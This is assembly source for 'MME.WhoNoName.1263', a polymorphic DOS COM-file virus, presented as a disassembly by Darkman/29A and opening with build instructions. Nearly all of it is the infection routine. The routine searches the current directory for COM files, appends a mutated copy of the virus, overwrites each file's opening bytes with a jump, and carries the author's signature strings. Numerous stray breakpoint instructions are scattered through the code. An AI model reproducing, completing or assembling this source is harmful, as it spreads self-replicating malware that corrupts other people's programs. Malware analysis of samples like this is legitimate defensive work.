comment *
                           MME.WhoNoName.1263
                             Disassembly by
                              Darkman/29A

  MME.WhoNoName.1263 is a 1263 bytes parasitic direct action COM virus.
  Infects every file in current directory, when executed, by appending the
  virus to the infected COM file. MME.WhoNoName.1263 is polymorphic in file
  using MIni Mutation Engine v 1.00 [MIME].

  To compile MME.WhoNoName.1263 with Turbo Assembler v 4.0 type:
    TASM /M WHON1263.ASM
    TLINK /x /t WHON1263.OBJ MIME.OBJ
*

.model small
.code
.286
 org   100h                              ; Origin of MME.WhoNoName.1263

extrn        mime:near,emime:near        ; Include MIni Mutation Engine v 1...

code_begin:
	     jmp     virus_begin
virus_begin:
	     call    delta_offset
delta_offset:
	     pop     si                  ; Load SI from stack
	     sub     si,offset delta_offset

	     mov     di,si               ; DI = delta offset
	     and     di,1111111111110000b
	     mov     ax,di               ; AX =   "     "
	     mov     cl,04h
	     shr     ax,cl               ; Divide by paragraphs
	     mov     cx,cs               ; CX = code segment
	     add     ax,cx               ; Add code segment to delta offset...
	     push    ax                  ; Save AX at stack

	     lea     ax,virus_begin_     ; AX = offset of virus_begin_
	     push    ax                  ; Save AX at stack

	     lea     cx,emime            ; CX = offset of emime
	     cld                         ; Clear direction flag
	     rep     movsb               ; Move virus to delta segment

	     int     03h

	     retf                        ; Return far!
virus_begin_:
	     push    cs                  ; Save CS at stack
	     pop     ds                  ; Load DS from stack (CS)

	     lea     si,origin_code      ; SI = offset of origin_code
	     xor     di,di               ; Zero DI
	     cmp     cs:[origin_code],00h
	     int     03h
	     je      first_gen           ; First generation? Jump to first_...

	     mov     di,100h             ; DI = offset of beginning of code
	     push    di                  ; Save DI at stack
	     movsw                       ; Move the original code to beginning
	     movsw                       ;  "    "     "      "   "      "
	     pop     di                  ; Load DI from stack
first_gen:
	     push    es di               ; Save registers at stack

	     push    es                  ; Save ES at stack

	     mov     ah,1ah              ; Set disk transfer area ddress
	     lea     dx,dta              ; DX = offset of dta
	     int     21h

	     mov     si,03h              ; Infect three files when executed

	     mov     ah,4eh              ; Find first matching file
	     mov     cx,0000000000000011b
	     lea     dx,file_specifi     ; DX = offset of file_specifi
	     int     21h
	     int     03h
	     jnc     call_infect         ; No error? Jump to call_infect

	     jmp     virus_exit

	     db      '[This is WhoNoName V2.1 Virus By Dark Tommy]'
	     db      'The WhoNoName V2.1 Virus Make With MiMe v1.0'
find_next:
	     mov     ah,4fh              ; Find next matching file
	     int     21h
	     int     03h
	     jc      virus_exit          ; Error? Jump to virus_exit
call_infect:
	     int     03h
	     call    infect_file

	     dec     si                  ; Already infected three files?
	     jnz     find_next           ; Not zero? Jump to find_next
virus_exit:
	     pop     es                  ; Load ES from stack

	     push    es                  ; Save ES at stack
	     pop     ds                  ; Load DS from stack (ES)

	     mov     dx,80h              ; DX = offset of default DTA
	     mov     ah,1ah              ; Set disk transfer area ddress
	     int     21h

	     int     03h

	     retf                        ; Return far!

infect_file  proc    near                ; Infect COM file
	     lea     dx,filename         ; DX = offset of filename
	     mov     ax,3d02h            ; Open file (read/write)
	     int     21h
	     xchg    ax,bx               ; BX = file handle

	     mov     ah,3fh              ; Read from file
	     mov     cx,04h              ; Read four bytes
	     lea     dx,origin_code      ; DX = offset of origin_code
	     int     21h

	     inc     si                  ; Infect three files when executed

	     cmp     cs:[origin_code],0aeh
	     int     03h
	     je      close_file          ; Already infected? Jump to close_...

	     dec     si                  ; Infect two files when executed
	     push    si                  ; Save SI at stack

	     xor     cx,cx               ; Zero CX
	     xor     dx,dx               ; Zero DX
	     mov     ax,4202h            ; Set current file position (EOF)
	     int     21h

	     push    bx                  ; Save BX at stack
	     mov     bx,ax               ; BX = filesize
	     add     bx,100h             ; Add offset of beginning of code
	     sub     ax,04h              ; Subtract size of infection code
	     mov     word ptr cs:[infect_code+02h],ax

	     lea     ax,emime+0fh        ; AX = offset of emime + 0fh
	     mov     cl,04h
	     shr     ax,cl               ; Divide by paragraphs
	     mov     cx,cs               ; CX = code segment
	     add     ax,cx               ; Add code segment to offset of em...
	     mov     es,ax               ; ES = segment of destination

	     lea     cx,emime            ; CX = offset of emime
	     mov     si,100h             ; SI = offset of beginning of code
	     mov     di,00h              ; DI = offset of destination
	     int     03h
	     call    mime
	     pop     bx

	     mov     ah,40h              ; Write to file
	     int     21h

	     push    cs                  ; Save CS at stack
	     pop     ds                  ; Load DS from stack (CS)

	     xor     cx,cx               ; Zero CX
	     xor     dx,dx               ; Zero DX
	     mov     ax,4200h            ; Set current file position (SOF)
	     int     21h

	     mov     ah,40h              ; Write to file
	     mov     cx,04h              ; Write four bytes
	     lea     dx,infect_code      ; DX = offset of infect_code
	     int     21h

	     pop     si                  ; Load SI from stack
close_file:
	     mov     ah,3eh              ; Close file
	     int     21h

	     int     03h

	     ret                         ; Return!
	     endp

infect_code  db      0aeh,0e9h,?,?       ; SCASB; JMP imm16
origin_code  db      04h dup(00h)        ; Original code of infected file
file_specifi db      '*.com',00h         ; File specification
dta:
	     db      15h dup(?)          ; Used by DOS for find next-process
file_attr    db      ?                   ; File attribute
file_time    dw      ?                   ; File time
file_date    dw      ?                   ; File date
filesize     dd      ?                   ; Filesize
filename     db      0dh dup(?)          ; Filename

	     db      04h dup(00h)
code_end:

end	     code_begin

